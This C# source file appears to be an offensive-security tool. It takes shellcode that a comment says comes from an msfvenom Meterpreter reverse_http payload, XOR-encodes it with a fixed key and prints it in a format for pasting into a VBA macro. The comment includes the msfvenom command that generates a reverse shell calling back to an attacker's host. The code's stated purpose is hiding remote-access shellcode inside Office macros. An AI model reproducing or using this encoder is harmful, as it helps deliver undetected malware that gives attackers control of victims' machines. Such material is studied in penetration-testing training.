using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.IO;
using System.Text.RegularExpressions;

namespace EncryptVBA
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine("Usage: EncryptVBA.exe <path_to_payload_text_file>");
                return;
            }

            // path to contents of: msfvenom -p windows/meterpreter/reverse_http LHOST=$LHOST LPORT=$LPORT -f csharp > met.cs
            string filePath = args[0];
            string fileContent = File.ReadAllText(filePath);
            int iXORKey = 0xfa;
            Console.WriteLine("XOR Key = " + iXORKey);



            //////////////////////////// INPUT STRING PROCESSING //////////////////////////////////////////
            // Strip all newline characters
            fileContent = Regex.Replace(fileContent, @"\r|\n", "");
            // strip starting text before the start of the array: "byte[] buf = new byte[540] {"
            string[] rawString1 = fileContent.Split('{');
            string rawString2 = rawString1[1];
            // strip ending text at the end of the array: "};"
            string[] rawString3 = rawString2.Split('}');
            string rawString4 = rawString3[0];

            // Split the content by commas and convert to bytes
            byte[] buf = rawString4.Split(',')
                                    .Select(s => Convert.ToByte(s.Trim(), 16)) // Assumes hexadecimal values
                                    .ToArray();
            /////////////////////////////////////////////////////////////////////////////////////////






            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] ^ iXORKey) & 0xFF);
            }
            uint counter = 0;

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {


                hex.AppendFormat("{0:D}, ", b);
                counter++;
                if (counter % 50 == 0)
                {
                    hex.AppendFormat("_{0}", Environment.NewLine);
                }
            }

            // Remove the last ", " from the string
            string cleanedString = hex.ToString().TrimEnd(new char[] { ',', ' ' });
            Console.WriteLine(cleanedString);
        }
    }
}